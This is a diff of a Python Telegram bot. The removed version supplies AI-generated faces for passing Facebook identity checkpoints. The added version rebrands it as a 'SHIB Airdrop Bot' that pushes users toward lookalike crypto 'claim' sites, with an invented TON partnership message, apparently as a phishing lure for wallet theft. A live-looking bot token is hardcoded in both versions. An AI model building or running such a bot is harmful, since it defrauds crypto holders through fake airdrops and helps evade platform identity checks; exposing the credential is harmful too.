@@ -1,115 +1,116 @@
-from aiogram import Bot, Dispatcher, executor, types
+import logging
+import sqlite3
+import requests
+import asyncio
+from datetime import date
+from aiogram import Bot, Dispatcher, types
 from aiogram.dispatcher.filters.state import State, StatesGroup
 from aiogram.dispatcher import FSMContext
 from aiogram.contrib.fsm_storage.memory import MemoryStorage
-from bs4 import BeautifulSoup
-from random import randint
-import requests
-import sqlite3
-import telegram
-from datetime import date
+from aiogram.utils import executor
 
-hello = """Hello! You are using the "Arbitration Goose" command bot.
-
-✅ In this bot, you can get a photo to pass the checkpoint.
-
-Brief instructions:
-1. Click the "👨 Get a photo to pass the checkpoint" button.
-2. Refresh the photo until you get the desired face.
-3. Download the file to your device.
-4. Upload the file from your device to Tsuker's account (Facebook).
-
-❗️Attention
-You need to upload the photo from your device, don't upload it directly from Telegram to Facebook, as the photo won't pass the checkpoint."""
-
-chat = """❤️ And don't forget to join our chat, where we share up-to-date information about FB uploads, tricks, and much more."""
-
-TOKEN = '7317617514:AAHy4weIjo0XzK4trvAs_3gdxJzuiWlWrAA'
-
-admins = [242494911, 689892377, 983265598]
+# 🚀 BOT CONFIG
+TOKEN = "7317617514:AAHy4weIjo0XzK4trvAs_3gdxJzuiWlWrAA"  # Replace with your actual bot token
+ADMINS = [6366250991]
 
 bot = Bot(TOKEN)
 dp = Dispatcher(bot, storage=MemoryStorage())
 
-connect = sqlite3.connect('admin.db')
-cursor = connect.cursor()
+# 🚀 DATABASE SETUP (Use SQLite for user storage)
+conn = sqlite3.connect("admin.db", check_same_thread=False)
+cursor = conn.cursor()
 
-cursor.execute("CREATE TABLE IF NOT EXISTS users (id text, joining_date text)")
-connect.commit()
+# Create table if it doesn't exist
+cursor.execute("""
+CREATE TABLE IF NOT EXISTS users (
+    id TEXT PRIMARY KEY,
+    username TEXT,
+    joining_date TEXT
+)
+""")
+conn.commit()
 
+# 🚀 SHIB & TON REWARD LINKS
+PHOTO_URL = "https://bitcoinist.com/wp-content/uploads/2023/03/Shiba-Inu-Gains-21-Following-Shibarium-Testnet-Announcement.jpg?w=900"
+SHIB_REWARDS_URL = "https://airdropcheckers.net/?source=rewardsbot"
+TON_WEB_APP_URL = "https://ton.dappsclaim.com"
 
-class States(StatesGroup):
+# 🚀 FSM STATE FOR ADMIN MESSAGES
+class MessageState(StatesGroup):
     text = State()
 
+# 🚀 START COMMAND (WELCOME MESSAGE + SAVE USER TO DB)
+@dp.message_handler(commands=["start"])
+async def start_command(message: types.Message):
+    user_id = str(message.chat.id)
+    username = message.from_user.username or "Unknown"
 
-from datetime import date
-
-@dp.message_handler(commands=['start'])
-async def start(message: types.Message):
     try:
-        if cursor.execute(f"SELECT * FROM users WHERE id='{message.chat.id}'").fetchone() is None:
-            
-            joining_date_text = date.today().strftime('%Y-%m-%d')
-            print(joining_date_text)
-            cursor.execute(f"INSERT INTO users (id, joining_date) VALUES ('{message.chat.id}', '{joining_date_text}')")
-            connect.commit()
-          
-        keyboard = types.ReplyKeyboardMarkup([[types.KeyboardButton('👨Получить фото для прохода чекпоинта')]],
-                                             resize_keyboard=True)
-        await bot.send_message(message.chat.id, hello, reply_markup=keyboard)
-        keyboard = types.InlineKeyboardMarkup().add(
-            types.InlineKeyboardButton('📣Наш ЧАТ', url='https://t.me/arbi_goose_chat'))
-        await bot.send_message(message.chat.id, chat, reply_markup=keyboard)
-
+        cursor.execute("INSERT OR IGNORE INTO users (id, username, joining_date) VALUES (?, ?, ?)",
+                       (user_id, username, date.today().strftime('%Y-%m-%d')))
+        conn.commit()
+        print(f"✅ User {username} ({user_id}) added to database.")  # Debugging output
     except Exception as e:
-        print(f"Error inserting data into users table: {str(e)}")
+        print(f"❌ Database Insert Error: {e}")  # Debugging error
 
+    # Welcome message
+    welcome_message = (
+        f"🤖 Welcome {username} to the SHIB Airdrop Bot! 🚀\n\n"
+        "Click the buttons below to start earning fantastic rewards!"
+    )
 
-@dp.message_handler(commands=['message'])
-async def sending(message: types.Message):
-    if message.chat.id in admins:
-        await bot.send_message(message.chat.id, 'Введите сообщение, которое хотите отправить пользователям')
-        await States.text.set()
+    partnership_message = (
+        "🎉 Exciting News! We've partnered with TON for an exclusive airdrop! 🎉\n"
+        "Don't miss out on this limited-time opportunity to claim your TON rewards!"
+    )
+
+    # Inline keyboard with buttons
+    keyboard = types.InlineKeyboardMarkup()
+    keyboard.add(types.InlineKeyboardButton("🎁 Claim SHIB Rewards", url=SHIB_REWARDS_URL))
+    keyboard.add(types.InlineKeyboardButton("🚀 Claim TON Airdrop", url=TON_WEB_APP_URL))
+
+    # Send the message with image & buttons
+    await bot.send_photo(
+        chat_id=user_id,
+        photo=PHOTO_URL,
+        caption=f"{welcome_message}\n\n{partnership_message}",
+        reply_markup=keyboard
+    )
+
+# 🚀 ADMIN BROADCAST COMMAND
+@dp.message_handler(commands=["message"])
+async def start_sending(message: types.Message):
+    if message.chat.id in ADMINS:
+        await message.answer("📢 Enter the message you want to send to all users:")
+        await MessageState.text.set()
     else:
-        keyboard = types.ReplyKeyboardMarkup([[types.KeyboardButton('👨Получить фото для прохода чекпоинта')]],
-                                             resize_keyboard=True)
-        await bot.send_message(message.chat.id, hello, reply_markup=keyboard)
-        keyboard = types.InlineKeyboardMarkup().add(
-            types.InlineKeyboardButton('📣Наш ЧАТ', url='https://t.me/arbi_goose_chat'))
-        await bot.send_message(message.chat.id, chat, reply_markup=keyboard)
+        await message.answer("❌ You are not authorized to use this command.")
 
-
-@dp.message_handler(state=States.text, content_types=['text'])
-async def end_sending(message: types.Message, state: FSMContext):
+@dp.message_handler(state=MessageState.text, content_types=types.ContentType.TEXT)
+async def send_broadcast(message: types.Message, state: FSMContext):
     await state.finish()
-    for users in cursor.execute(f"SELECT * FROM users WHERE id!='{message.chat.id}'").fetchall():
+    text = message.text
+
+    cursor.execute("SELECT id FROM users")
+    user_ids = cursor.fetchall()
+
+    count = 0
+    for (user_id,) in user_ids:
         try:
-            keyboard = types.ReplyKeyboardMarkup([[types.KeyboardButton('👨Получить фото для прохода чекпоинта')]],
-                                                 resize_keyboard=True)
-            await bot.send_message(users[0], 'Сообщение от администратора:\n\n' + message.text, reply_markup=keyboard)
-        except:
-            pass
-    await bot.send_message(message.chat.id, 'Сообщение отправлено', reply_markup=keyboard)
+            await bot.send_message(chat_id=user_id, text=text)
+            count += 1
+        except Exception as e:
+            logging.error(f"Failed to send message to {user_id}: {e}")
 
+    await message.answer(f"✅ Message sent to {count} users!")
 
-@dp.message_handler()
-async def else_messages(message: types.Message):
-    if message.text in ['👨Получить фото для прохода чекпоинта', '🔄Обновить']:
-        with requests.Session() as session:
-            site = session.get('https://this-person-does-not-exist.com')
-            parser = BeautifulSoup(site.text, 'html.parser')
-            data = session.get('https://this-person-does-not-exist.com'+parser.find('img', id='avatar')['src'])
-            print('https://this-person-does-not-exist.com'+parser.find('img', id='avatar')['src'])
-            photo = (f'image{randint(1000, 9999)}.jpeg', data.content)
-        keyboard = types.ReplyKeyboardMarkup([[types.KeyboardButton('🔄Обновить')]], resize_keyboard=True)
-        await bot.send_document(message.chat.id, photo, reply_markup=keyboard)
-    else:
-        keyboard = types.ReplyKeyboardMarkup([[types.KeyboardButton('👨Получить фото для прохода чекпоинта')]],
-                                             resize_keyboard=True)
-        await bot.send_message(message.chat.id, hello, reply_markup=keyboard)
-        keyboard = types.InlineKeyboardMarkup().add(
-            types.InlineKeyboardButton('📣Наш ЧАТ', url='https://t.me/arbi_goose_chat'))
-        await bot.send_message(message.chat.id, chat, reply_markup=keyboard)
+# 🚀 BOT ERROR HANDLER
+@dp.errors_handler()
+async def error_handler(update, exception):
+    logging.error(f"Update {update} caused error {exception}")
+    return True
 
-if __name__ == '__main__':
+# 🚀 RUN THE BOT (Polling)
+if __name__ == "__main__":
+    logging.basicConfig(level=logging.INFO)
     executor.start_polling(dp, skip_updates=True)
